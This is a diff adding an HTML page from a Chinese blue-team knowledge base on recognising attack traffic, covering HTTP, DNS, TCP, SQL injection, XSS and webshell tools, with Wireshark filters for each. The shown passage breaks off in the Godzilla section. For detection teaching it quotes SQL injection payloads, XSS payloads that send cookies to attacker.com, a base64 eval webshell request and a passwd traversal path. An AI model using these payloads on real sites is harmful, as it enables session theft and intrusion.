@@ -1,0 +1,2166 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>流量特征原理 - HW流量分析知识库</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
+  <script src="https://unpkg.com/lucide@latest"></script>
+</head>
+<body class="min-h-screen">
+  <header class="fixed top-0 left-0 right-0 z-50 header-blur border-b border-[var(--border)]">
+    <div class="max-w-7xl mx-auto px-6 py-4">
+      <div class="flex items-center justify-between">
+        <a href="index.html" class="flex items-center gap-3">
+          <div class="w-10 h-10 rounded-lg bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center">
+            <i data-lucide="shield-alert" class="w-6 h-6 text-white"></i>
+          </div>
+          <div>
+            <h1 class="text-lg font-bold text-[var(--text-primary)]">HW流量分析</h1>
+            <p class="text-xs" style="color: var(--text-secondary)">知识库</p>
+          </div>
+        </a>
+        <div class="flex items-center gap-4">
+          <nav class="hidden md:flex items-center gap-8">
+            <a href="theory.html" class="nav-link text-sm font-medium active" style="color: var(--text-secondary)">流量特征</a>
+            <a href="methods.html" class="nav-link text-sm font-medium" style="color: var(--text-secondary)">分析方法</a>
+            <a href="filters.html" class="nav-link text-sm font-medium" style="color: var(--text-secondary)">筛选命令</a>
+          </nav>
+          <button id="theme-toggle" class="p-2 rounded-lg transition-colors" style="--hover-bg: var(--hover-bg)">
+            <i data-lucide="moon" id="theme-icon" class="w-5 h-5" style="color: var(--text-secondary)"></i>
+          </button>
+          <button class="mobile-menu-btn md:hidden p-2">
+            <i data-lucide="menu" class="w-6 h-6" style="color: var(--text-secondary)"></i>
+          </button>
+        </div>
+      </div>
+      <div class="mobile-menu hidden md:hidden mt-4 pb-4 border-t pt-4" style="border-color: var(--border)">
+        <nav class="flex flex-col gap-4">
+          <a href="theory.html" class="nav-link text-sm font-medium" style="color: var(--text-secondary)">流量特征</a>
+          <a href="methods.html" class="nav-link text-sm font-medium" style="color: var(--text-secondary)">分析方法</a>
+          <a href="filters.html" class="nav-link text-sm font-medium" style="color: var(--text-secondary)">筛选命令</a>
+        </nav>
+      </div>
+    </div>
+  </header>
+
+  <main class="pt-24 pb-16">
+    <div class="max-w-7xl mx-auto px-6">
+      <div class="flex gap-8">
+        <aside class="hidden lg:block w-64 flex-shrink-0">
+          <div class="sticky top-24">
+            <nav class="space-y-1">
+              <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-3">协议特征</p>
+              <a href="#http" class="toc-link block py-1 px-2 rounded text-sm">HTTP/HTTPS流量</a>
+              <a href="#dns" class="toc-link block py-1 px-2 rounded text-sm">DNS协议流量</a>
+              <a href="#tcp" class="toc-link block py-1 px-2 rounded text-sm">TCP/UDP流量</a>
+              <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-3 mt-6">Web攻击</p>
+              <a href="#sqli" class="toc-link block py-1 px-2 rounded text-sm">SQL注入</a>
+              <a href="#xss" class="toc-link block py-1 px-2 rounded text-sm">XSS攻击</a>
+              <a href="#ssr" class="toc-link block py-1 px-2 rounded text-sm">SSRF攻击</a>
+              <a href="#rce" class="toc-link block py-1 px-2 rounded text-sm">命令注入/RCE</a>
+              <a href="#upload" class="toc-link block py-1 px-2 rounded text-sm">文件上传攻击</a>
+              <a href="#xxe" class="toc-link block py-1 px-2 rounded text-sm">XXE注入</a>
+              <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-3 mt-6">WebShell工具</p>
+              <a href="#webshell-antsword" class="toc-link block py-1 px-2 pl-4 rounded text-sm text-xs">蚁剑 AntSword</a>
+              <a href="#webshell-behinder" class="toc-link block py-1 px-2 pl-4 rounded text-sm text-xs">冰蝎 Behinder</a>
+              <a href="#webshell-godzilla" class="toc-link block py-1 px-2 pl-4 rounded text-sm text-xs">哥斯拉 Godzilla</a>
+              <a href="#webshell-chopper" class="toc-link block py-1 px-2 pl-4 rounded text-sm text-xs">菜刀</a>
+              <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-3 mt-6">渗透工具</p>
+              <a href="#scanners" class="toc-link block py-1 px-2 rounded text-sm">扫描器指纹</a>
+              <a href="#lateral" class="toc-link block py-1 px-2 rounded text-sm">横向移动</a>
+              <a href="#reverseshell" class="toc-link block py-1 px-2 rounded text-sm">反弹Shell</a>
+              <a href="#tunnel" class="toc-link block py-1 px-2 rounded text-sm">隧道流量</a>
+              <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-3 mt-6">高级分析</p>
+              <a href="#encrypted" class="toc-link block py-1 px-2 rounded text-sm">加密流量分析</a>
+              <a href="#attack-chain" class="toc-link block py-1 px-2 rounded text-sm">攻击链分析</a>
+            </nav>
+          </div>
+        </aside>
+
+        <div class="flex-1 min-w-0">
+          <div class="mb-8">
+            <h1 class="text-3xl font-bold mb-4">流量特征原理</h1>
+            <p class="text-gray-400">掌握常见网络协议的攻击流量特征，能够快速识别各类网络攻击行为</p>
+          </div>
+
+          <!-- HTTP流量特征 -->
+          <section id="http" class="mb-12" data-toc-id="http">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-blue-500/20 flex items-center justify-center">
+                <i data-lucide="globe" class="w-5 h-5 text-blue-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">HTTP/HTTPS流量特征</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold flex items-center gap-2">
+                    <span class="badge badge-info">原理</span>
+                    HTTP请求方法分布
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">正常业务流量的HTTP请求方法有明显的分布特征，GET请求通常占70%以上，POST次之。当发现异常的方法分布时，应警惕攻击行为。</p>
+                  <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-green-400 mb-2">正常分布</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>GET: 70-80%</li>
+                        <li>POST: 15-25%</li>
+                        <li>PUT/DELETE: &lt;5%</li>
+                      </ul>
+                    </div>
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-red-400 mb-2">异常分布</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>POST占比突然升高</li>
+                        <li>出现OPTIONS/HEAD等探测方法</li>
+                        <li>TRACE方法（测试路由）</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold flex items-center gap-2">
+                    <span class="badge badge-warning">重点</span>
+                    User-Agent分析
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">User-Agent字段可以揭示客户端类型，攻击者常使用工具化的User-Agent或伪造知名浏览器的标识。</p>
+                  <div class="code-block">
+                    <div class="lang-label">常见攻击工具UA</div>
+                    <pre><code class="language-bash"># SQL注入探测工具
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Sqlmap/1.6.8#stable
+
+# 目录扫描工具
+Mozilla/5.0 (compatible; DirBuster-0.12; +http://www.owasp.org/)
+python-requests/2.28.0
+
+# 漏洞利用工具
+Metasploit Framework 6.3.0
+wget/1.21.3
+
+# 浏览器伪装（正常）
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</code></pre>
+                  </div>
+                  <div class="mt-4 flex items-center gap-2 text-sm">
+                    <i data-lucide="alert-triangle" class="w-4 h-4 text-yellow-400"></i>
+                    <span class="text-gray-400">发现非浏览器UA或工具化UA时，需要重点关注后续攻击行为</span>
+                  </div>
+                </div>
+              </div>
+
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold">URL路径模式分析</h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">正常的URL路径符合业务逻辑，攻击流量往往包含特殊字符、编码或异常路径结构。</p>
+                  <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div>
+                      <h4 class="text-sm font-medium text-green-400 mb-2">正常URL特征</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>/api/user/login</li>
+                        <li>/products/list?page=1</li>
+                        <li>/static/css/style.css</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h4 class="text-sm font-medium text-red-400 mb-2">可疑URL特征</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>/admin/config.php.bak</li>
+                        <li>/..%2F..%2Fetc/passwd</li>
+                        <li>/?id=1 UNION SELECT</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold">HTTP响应状态码分析</h3>
+                </div>
+                <div class="p-4">
+                  <div class="overflow-x-auto">
+                    <table class="w-full text-sm">
+                      <thead>
+                        <tr class="text-left text-gray-400 border-b border-gray-700">
+                          <th class="pb-2">状态码</th>
+                          <th class="pb-2">含义</th>
+                          <th class="pb-2">关注点</th>
+                        </tr>
+                      </thead>
+                      <tbody class="text-gray-300">
+                        <tr class="border-b border-gray-800">
+                          <td class="py-2 text-green-400">200</td>
+                          <td class="py-2">正常响应</td>
+                          <td class="py-2">结合上下文判断是否为攻击成功</td>
+                        </tr>
+                        <tr class="border-b border-gray-800">
+                          <td class="py-2 text-yellow-400">301/302</td>
+                          <td class="py-2">重定向</td>
+                          <td class="py-2">恶意重定向、钓鱼跳转</td>
+                        </tr>
+                        <tr class="border-b border-gray-800">
+                          <td class="py-2 text-blue-400">400</td>
+                          <td class="py-2">错误请求</td>
+                          <td class="py-2">探测类攻击常返回400</td>
+                        </tr>
+                        <tr class="border-b border-gray-800">
+                          <td class="py-2 text-red-400">403</td>
+                          <td class="py-2">禁止访问</td>
+                          <td class="py-2">扫描敏感目录</td>
+                        </tr>
+                        <tr class="border-b border-gray-800">
+                          <td class="py-2 text-purple-400">500</td>
+                          <td class="py-2">服务器错误</td>
+                          <td class="py-2">可能存在注入成功导致应用报错</td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- DNS流量特征 -->
+          <section id="dns" class="mb-12" data-toc-id="dns">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-green-500/20 flex items-center justify-center">
+                <i data-lucide="dns" class="w-5 h-5 text-green-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">DNS协议流量特征</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold">DNS查询类型分布</h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">正常的DNS查询以A记录和AAAA记录为主，如果发现大量MX、NS、TXT、CNAME等记录查询，警惕DNS隧道或数据外传。</p>
+                  <div class="code-block">
+                    <div class="lang-label">Wireshark筛选</div>
+                    <pre><code class="language-bash"># 筛选TXT记录查询（常用于DNS隧道）
+dns.qry.type == 16
+
+# 筛选MX记录查询
+dns.qry.type == 15
+
+# 筛选异常大的DNS响应（隧道可能携带更多数据）
+dns.resp.len > 200</code></pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold flex items-center gap-2">
+                    <span class="badge badge-danger">重点</span>
+                    DGA域名识别
+                  </h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">域名生成算法（Domain Generation Algorithm）被恶意软件用于频繁更换C2域名，特征如下：</p>
+                  <ul class="text-sm text-gray-400 space-y-2 mb-4">
+                    <li class="flex items-start gap-2">
+                      <i data-lucide="check-circle" class="w-4 h-4 text-green-400 mt-0.5"></i>
+                      <span>域名长度随机，通常较长</span>
+                    </li>
+                    <li class="flex items-start gap-2">
+                      <i data-lucide="check-circle" class="w-4 h-4 text-green-400 mt-0.5"></i>
+                      <span>包含随机数字和字母组合</span>
+                    </li>
+                    <li class="flex items-start gap-2">
+                      <i data-lucide="check-circle" class="w-4 h-4 text-green-400 mt-0.5"></i>
+                      <span>常见恶意软件家族特征词</span>
+                    </li>
+                    <li class="flex items-start gap-2">
+                      <i data-lucide="check-circle" class="w-4 h-4 text-green-400 mt-0.5"></i>
+                      <span>同一IP解析大量不同域名</span>
+                    </li>
+                  </ul>
+                  <div class="code-block">
+                    <div class="lang-label">DGA域名示例</div>
+                    <pre><code class="language-bash"># Conficker蠕虫
+mxgqjwfkhk.cn, nbeutqehxkh.ru, cyihndmqwhwc.cn
+
+# Zeus GameOver
+7h5g4hb7.com, 8j6k5l3a2.ru, 9k7m6n5b4.com
+
+# Necurs
+kpldtmkfqfhhhr.com, gqowyjmqmfgbgq.com</code></pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold">DNS隧道流量特征</h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">DNS隧道通过DNS协议传输数据，绕过网络限制。特征包括：</p>
+                  <ul class="text-sm text-gray-400 space-y-2">
+                    <li>查询频率异常高（远超过正常业务需求）</li>
+                    <li>子域名长度异常（base32/base64编码数据藏在子域名中）</li>
+                    <li>TXT记录请求大量出现</li>
+                    <li>相同域名的高频查询（心跳机制）</li>
+                    <li>DNS响应中携带异常大量的数据</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- TCP/UDP流量 -->
+          <section id="tcp" class="mb-12" data-toc-id="tcp">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-yellow-500/20 flex items-center justify-center">
+                <i data-lucide="network" class="w-5 h-5 text-yellow-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">TCP/UDP流量特征</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold">TCP连接状态分析</h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">TCP连接状态异常往往预示着攻击行为。</p>
+                  <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-red-400 mb-2">异常连接状态</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>大量SYN_SENT状态（端口扫描）</li>
+                        <li>大量FIN_WAIT_1（拒绝服务）</li>
+                        <li>短时间内的重复连接（暴力破解）</li>
+                        <li>异常端口的SYN连接</li>
+                      </ul>
+                    </div>
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-yellow-400 mb-2">需要关注的标志位</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>PSH+ACK 数据传输</li>
+                        <li>异常RST连接断开</li>
+                        <li>无载荷的SYN包（探测）</li>
+                        <li>畸形TCP标志位组合</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold">端口扫描识别</h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">端口扫描是网络侦察的常见手段，流量特征明显：</p>
+                  <div class="code-block">
+                    <div class="lang-label">端口扫描流量特征</div>
+                    <pre><code class="language-bash"># SYN扫描特征
+- 大量发往不同端口的SYN包
+- 目标端口响应SYN+ACK（开放）或RST（关闭）
+- 源端口通常为高端口
+
+# Connect扫描特征
+- 完整的TCP三次握手
+- 可能触发IDS/IPS告警
+
+# UDP扫描特征
+- ICMP Port Unreachable响应判断端口状态
+- 扫描速度相对较慢</code></pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold">TTL值分析</h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">TTL值可以初步判断攻击者的地理位置和操作系统类型：</p>
+                  <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium mb-2">Windows (TTL=128)</h4>
+                      <p class="text-xs text-gray-400">通过计算跳数可判断是否为内网横移</p>
+                    </div>
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium mb-2">Linux (TTL=64)</h4>
+                      <p class="text-xs text-gray-400">Web服务器、攻击者主机</p>
+                    </div>
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium mb-2">网络设备 (TTL=255)</h4>
+                      <p class="text-xs text-gray-400">路由器、交换机</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- SQL注入 -->
+          <section id="sqli" class="mb-12" data-toc-id="sqli">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-red-500/20 flex items-center justify-center">
+                <i data-lucide="database" class="w-5 h-5 text-red-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">SQL注入流量特征</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold">SQL注入攻击特征</h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">SQL注入通过在用户输入中插入恶意SQL语句，获取数据库敏感信息或执行非法操作。</p>
+
+                  <h4 class="text-sm font-medium text-red-400 mb-2">常见注入特征</h4>
+                  <div class="code-block mb-4">
+                    <div class="lang-label">SQL注入payload示例</div>
+                    <pre><code class="language-sql"># 经典永真式
+' OR '1'='1
+' OR 1=1--
+admin'--
+
+# UNION注入
+' UNION SELECT NULL--
+' UNION SELECT username,password FROM users--
+
+# 报错注入
+' AND (SELECT CASE WHEN 1=1 THEN 1/0 ELSE 0 END)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+
+# 布尔注入
+' AND 1=1--
+' AND 1=2--
+
+# 时间盲注
+' AND SLEEP(5)--
+' AND IF(1=1,BENCHMARK(5000000,MD5('A')),0)--</code></pre>
+                  </div>
+
+                  <h4 class="text-sm font-medium text-yellow-400 mb-2">HTTP流量中的识别点</h4>
+                  <ul class="text-sm text-gray-400 space-y-1 mb-4">
+                    <li>URL参数或POST body中出现单引号、双引号、括号</li>
+                    <li>出现UNION、SELECT、FROM、WHERE等SQL关键字</li>
+                    <li>出现16进制编码或URL编码的特殊字符</li>
+                    <li>Cookie中携带SQL语句片段</li>
+                  </ul>
+
+                  <div class="code-block">
+                    <div class="lang-label">Wireshark筛选</div>
+                    <pre><code class="language-bash"># 筛选POST请求中的SQL注入特征
+http.request.method == POST && (http contains "'" || http contains "UNION" || http contains "SELECT")
+
+# 筛选可能的注入尝试
+http.request.uri contains "id=" && (http.request.uri contains "'" || http.request.uri contains "UNION")
+
+# 筛选错误信息泄露
+http contains "sql" && http contains "error"</code></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- XSS攻击 -->
+          <section id="xss" class="mb-12" data-toc-id="xss">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-orange-500/20 flex items-center justify-center">
+                <i data-lucide="code" class="w-5 h-5 text-orange-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">XSS攻击流量特征</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold">跨站脚本攻击特征</h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">XSS通过在网页中注入恶意脚本代码，窃取用户会话或执行恶意操作。</p>
+
+                  <h4 class="text-sm font-medium text-orange-400 mb-2">XSS Payload类型</h4>
+                  <div class="code-block mb-4">
+                    <div class="lang-label">XSS payload示例</div>
+                    <pre><code class="language-html">&lt;!-- 反射型XSS --&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg/onload=alert(document.domain)&gt;
+
+&lt;!-- 存储型XSS --&gt;
+&lt;script&gt;fetch('http://attacker.com?c='+document.cookie)&lt;/script&gt;
+
+&lt;!-- DOM型XSS --&gt;
+&lt;script&gt;location.href='http://attacker.com?c='+document.cookie&lt;/script&gt;
+
+&lt;!-- 编码绕过 --&gt;
+&lt;script&gt;eval(atob('YWxlcnQoJ1hTUycp'))&lt;/script&gt;</code></pre>
+                  </div>
+
+                  <h4 class="text-sm font-medium text-yellow-400 mb-2">识别要点</h4>
+                  <ul class="text-sm text-gray-400 space-y-1 mb-4">
+                    <li>请求中包含script、img、svg等HTML标签</li>
+                    <li>出现onerror、onload、onclick等事件处理器</li>
+                    <li>JavaScript函数调用：alert、eval、fetch、XMLHttpRequest</li>
+                    <li>十六进制或Unicode编码的字符</li>
+                  </ul>
+
+                  <div class="code-block">
+                    <div class="lang-label">Wireshark筛选</div>
+                    <pre><code class="language-bash"># 筛选script标签
+http contains "&lt;script"
+http contains "script&gt;"
+
+# 筛选事件处理器
+http contains "onerror="
+http contains "onload="
+
+# 筛选JavaScript函数
+http contains "alert("
+http contains "eval("
+http contains "fetch("</code></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- WebShell -->
+          <section id="webshell" class="mb-12" data-toc-id="webshell">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-purple-500/20 flex items-center justify-center">
+                <i data-lucide="file-code" class="w-5 h-5 text-purple-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">WebShell流量特征详解</h2>
+            </div>
+
+            <p class="text-gray-400 mb-6">以下详细介绍主流WebShell管理工具的通信特征，包括请求/响应格式和Wireshark筛选方法。</p>
+
+            <!-- 中国蚁剑 AntSword -->
+            <div id="webshell-antsword" class="content-card mb-6">
+              <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-green-900/20 to-transparent">
+                <h3 class="font-bold text-lg flex items-center gap-2">
+                  <span class="badge badge-normal">蚁剑</span>
+                  中国蚁剑 (AntSword)
+                </h3>
+              </div>
+              <div class="p-4">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                  <div>
+                    <h4 class="text-sm font-medium text-green-400 mb-3">通信特征</h4>
+                    <ul class="text-sm text-gray-400 space-y-2 mb-4">
+                      <li>• 使用base64编码加密通信内容</li>
+                      <li>• 请求参数通常为 <code class="text-green-400">z0</code>、<code class="text-green-400">z1</code>、<code class="text-green-400">z2</code></li>
+                      <li>• Cookie中包含 <code class="text-green-400">acw_sc__v2</code> 特征</li>
+                      <li>• User-Agent固定为 <code class="text-green-400">Mozilla/5.0 (Windows NT 6.1; Win64; x64)</code></li>
+                      <li>• 请求体格式: <code class="text-green-400">参数名=base64(命令)&参数名2=base64(...)</code></li>
+                    </ul>
+
+                    <h4 class="text-sm font-medium text-yellow-400 mb-3">请求示例 (Wireshark视图)</h4>
+                    <div class="code-block">
+                      <div class="lang-label">HTTP请求</div>
+                      <pre><code class="language-bash">POST /api.php HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64)
+Cookie: acw_sc__v2=xxxxxx; PHPSESSID=xxxxx
+Content-Type: application/x-www-form-urlencoded
+
+z0=QGV2YWwoJF9QT1NUWydjJ10pOw==&z1=QGV4ZWMoJF9QT1NUWydwJ10pOw==</code></pre>
+                    </div>
+                    <p class="text-xs text-gray-500 mt-2">z0参数解码: @eval($_POST['c']);</p>
+                  </div>
+
+                  <div>
+                    <h4 class="text-sm font-medium text-blue-400 mb-3">Wireshark筛选命令</h4>
+                    <div class="space-y-3">
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http contains "acw_sc__v2"</code>
+                        <p class="text-xs text-gray-500">筛选蚁剑特征Cookie</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "z0="</code>
+                        <p class="text-xs text-gray-500">筛选蚁剑z0参数请求</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "z1="</code>
+                        <p class="text-xs text-gray-500">筛选蚁剑z1参数请求</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.user_agent contains "Windows NT 6.1"</code>
+                        <p class="text-xs text-gray-500">筛选固定User-Agent</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http contains "@eval"</code>
+                        <p class="text-xs text-gray-500">筛选base64解码后的eval特征</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.request.method == POST && (http.request.uri contains "z0=" || http.request.uri contains "z1=")</code>
+                        <p class="text-xs text-gray-500">组合筛选蚁剑流量</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- 冰蝎 Behinder -->
+            <div id="webshell-behinder" class="content-card mb-6">
+              <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-blue-900/20 to-transparent">
+                <h3 class="font-bold text-lg flex items-center gap-2">
+                  <span class="badge badge-info">冰蝎</span>
+                  冰蝎 WebShell (Behinder)
+                </h3>
+              </div>
+              <div class="p-4">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                  <div>
+                    <h4 class="text-sm font-medium text-blue-400 mb-3">通信特征</h4>
+                    <ul class="text-sm text-gray-400 space-y-2 mb-4">
+                      <li>• 采用AES加密的动态密钥协商机制</li>
+                      <li>• 首次连接时发送密钥种子(16位字符串)</li>
+                      <li>• 请求头包含 <code class="text-blue-400">Proxy-Connection: keep-alive</code></li>
+                      <li>• 请求头包含 <code class="text-blue-400">Cache-Control: no-cache</code></li>
+                      <li>• Cookie: <code class="text-blue-400">BSESSIONID=...</code> (PHP)</li>
+                      <li>• 固定长度请求前缀，流量有特征可循</li>
+                    </ul>
+
+                    <h4 class="text-sm font-medium text-yellow-400 mb-3">请求示例 (Wireshark视图)</h4>
+                    <div class="code-block">
+                      <div class="lang-label">首次连接 - 密钥协商</div>
+                      <pre><code class="language-bash">POST /shell.php HTTP/1.1
+Host: target.com
+User-Agent: Java/1.8.0_141
+Proxy-Connection: keep-alive
+Cache-Control: no-cache
+Content-Type: text/plain
+Cookie: BSESSIONID=1234567890abcdef
+Content-Length: 1654
+
+[加密的payload内容 - 前16字节为密钥种子]</code></pre>
+                    </div>
+                    <div class="code-block mt-3">
+                      <div class="lang-label">后续请求 - AES加密通信</div>
+                      <pre><code class="language-bash">POST /shell.php HTTP/1.1
+Host: target.com
+User-Agent: Java/1.8.0_141
+Proxy-Connection: keep-alive
+Cookie: BSESSIONID=1234567890abcdef
+Content-Length: 2048
+
+[ AES加密后的命令内容 ]</code></pre>
+                    </div>
+                  </div>
+
+                  <div>
+                    <h4 class="text-sm font-medium text-purple-400 mb-3">Wireshark筛选命令</h4>
+                    <div class="space-y-3">
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.user_agent contains "Java/1.8"</code>
+                        <p class="text-xs text-gray-500">筛选Java客户端特征</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.header contains "Proxy-Connection"</code>
+                        <p class="text-xs text-gray-500">筛选冰蝎请求头特征</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.header contains "Cache-Control: no-cache"</code>
+                        <p class="text-xs text-gray-500">筛选no-cache特征</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-modo block mb-1">http.cookie contains "BSESSIONID"</code>
+                        <p class="text-xs text-gray-500">筛选PHP冰蝎Session Cookie</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">frame.len > 1000 && http</code>
+                        <p class="text-xs text-gray-500">筛选大量HTTP流量(加密payload较大)</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http contains "application/x-java-serialized-object"</code>
+                        <p class="text-xs text-gray-500">Java序列化的冰蝎流量</p>
+                      </div>
+                    </div>
+
+                    <div class="mt-4 p-3 bg-yellow-900/20 rounded-lg border border-yellow-700/30">
+                      <h5 class="text-xs font-medium text-yellow-400 mb-2">检测建议</h5>
+                      <p class="text-xs text-gray-400">冰蝎流量解密后可看到命令执行内容，建议关注：异常的Java User-Agent、固定的请求头组合、大尺寸加密HTTP流量</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- 哥斯拉 Godzilla -->
+            <div id="webshell-godzilla" class="content-card mb-6">
+              <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-yellow-900/20 to-transparent">
+                <h3 class="font-bold text-lg flex items-center gap-2">
+                  <span class="badge badge-warning">哥斯拉</span>
+                  哥斯拉 WebShell (Godzilla)
+                </h3>
+              </div>
+              <div class="p-4">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                  <div>
+                    <h4 class="text-sm font-medium text-yellow-400 mb-3">通信特征</h4>
+                    <ul class="text-sm text-gray-400 space-y-2 mb-4">
